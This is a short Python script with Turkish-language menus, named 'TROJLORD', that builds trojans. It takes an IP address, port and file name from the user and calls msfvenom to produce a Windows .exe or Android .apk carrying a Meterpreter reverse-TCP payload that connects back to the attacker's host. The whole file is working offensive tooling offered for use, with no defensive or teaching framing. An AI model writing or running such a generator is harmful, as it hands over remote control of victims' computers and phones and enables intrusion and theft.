import os


os.system("figlet TROJLORD")
print("""Trojan Oluşturma Programına Hoş Geldiniz
      1-Windows Sistemler İçin Trojan Oluştur
      2-Android Sistemler için Trojan Oluştur
      
      """)

seçim = input("Lütfen Yapmak İstediğiniz İşlemi Seçiniz:")

def windowsTrojanOluşturma():
    print("""Windows Trojan Oluşturma Programına Hoş Geldiniz""")
    ip = input("Lütfen Yerel Veya Dış İP Giriniz:")
    Port= input("Lütfen Portunuzu Giriniz:")
    trojan = input("Lütfen Oluşturmak İstediğiniz Trojanın Adını Giriniz: ")
    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={Port} -f exe > {trojan}.exe")

def androidTrojanOluşturma():
    print("""Android Trojan Oluşturma Programına Hoş Geldiniz""")
    trojan = input("Lütfen Oluşturmak İstediğiniz Trojanın Adını Giriniz: ")
    ip = input("Lüttfen Yerel Veya Dış İp Adresinizi Giriniz:")
    port = input("Lütfen Portunuzu Giriniz:")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -R apk > {trojan}.apk")


if seçim == "1":
    windowsTrojanOluşturma()
elif seçim == "2":
    androidTrojanOluşturma()
else:
    print("Yanlış Seçim Program Kapatılıyor...")
